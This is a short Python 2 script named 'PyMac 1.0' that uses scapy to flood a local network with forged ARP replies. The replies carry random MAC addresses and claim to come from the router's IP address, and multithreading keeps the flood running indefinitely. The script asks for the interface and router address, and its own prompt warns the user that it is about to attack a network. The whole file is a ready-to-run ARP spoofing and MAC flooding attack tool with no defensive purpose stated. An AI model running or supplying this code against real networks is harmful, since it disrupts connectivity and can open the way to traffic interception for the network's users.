from scapy.all import *
import threading
import sys
total = 0
print 'Welcome to PyMac 1.0 Created by Lewdz'
print ''
print 'Interface to attack on (Default eth0).'
interface = raw_input (">> ")
if interface == '':
	interface = 'eth0'
print 'Router Address (Default 192.168.0.1).'
sourceroute = raw_input (">> ")
if sourceroute == '':
	sourceroute = '192.168.0.1'
print 'Thread Limit.'
thread_limit = input(">> ")
raw_input("[Warning] - You are about to attack a network with random ARP requests. Hit enter to continue.")
class sendARP(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		sendp(Ether(src=RandMAC(), dst=RandMAC())/ARP(op=2, psrc=sourceroute, hwsrc=RandMAC(), hwdst=RandMAC())/Padding(load="X"*18), verbose=0, iface=interface)

while True:
	if threading.activeCount() < thread_limit: 
		sendARP().start()
		total = total + 1
		sys.stdout.write('\r')
		sys.stdout.write('%s Requests Sent'%(total))
		sys.stdout.flush()
